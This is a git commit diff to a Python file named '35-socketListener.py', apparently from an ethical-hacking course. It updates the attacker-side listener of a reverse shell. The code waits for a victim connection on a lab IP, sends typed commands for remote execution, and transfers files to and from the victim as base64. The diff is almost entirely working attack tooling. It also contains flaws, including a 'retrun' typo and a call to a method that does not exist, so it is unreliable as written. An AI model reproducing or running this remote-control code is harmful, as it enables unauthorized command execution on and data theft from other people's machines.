36bb4896f54e83b2f3c7d4decc3901194e8e0b92
Trojan277 <70176627+Trojan277@users.noreply.github.com>
2021-01-30 14:02:32 +0300

    Update 35-socketListener.py

--- 35-socketListener.py
+++ 35-socketListener.py
@@ -1,5 +1,7 @@
 import socket
-import json
+#import json
+import base64
+import simplejson
 
 class SocketListener:
     def __init__(self,ip,port):
@@ -12,16 +14,16 @@ class SocketListener:
         print('Connection Successful from ' + str(Address))
 
     def json_send(self,data):
-        json_data = json.dumps(data)
-        self.Connection.send(json_data)
+        json_data = simplejson.dumps(data)
+        self.Connection.send(json_data.encode('utf-8'))
 
     def json_receive(self):
         json_data = ''
 
         while True:
             try:
-                json_data = json_data + self.Connection.recv(1024)
-                return json.loads(json_data)
+                json_data = json_data + self.Connection.recv(1024).decode()
+                return simplejson.loads(json_data)
             except ValueError:
                 continue
 
@@ -36,18 +38,28 @@ class SocketListener:
 
     def save_file(self,path,content):
         with open(path, 'wb') as my_file:
-            my_file.write(content)
-            return 'Download Successful'
+            my_file.write(base64.b64decode(content))
+            return 'Upload Successful'
+
+    def read_file_content(self, path):
+        with open(path,'rb') as my_file:
+            retrun base64.b64encode(my_file.read())
 
     def start_listener(self):
         while True:
-            command_input = raw_input('Enter Command: ')
+            command_input = input('Enter Command: ')
             command_input = command_input.split(' ')
-            command_output = self.command_execution(command_input)
+            try:
+                if command_input[0] == 'upload':
+                    my_file_content = self.get_file_content(command_input[1])
+                    command_input.append(my_file_content)
 
-            if command_input[0] == 'download'
-                command_output = self.save_file(command_input[1],command_output)
+                command_output = self.command_execution(command_input)
 
+                if command_input[0] == 'download' and 'Error!' not in command_output:
+                    command_output = self.save_file(command_input[1],command_output)
+            except Exception:
+                command_output = 'Error'
             print(command_output)
 
 socket_listener = SocketListener('10.0.2.15',8080)
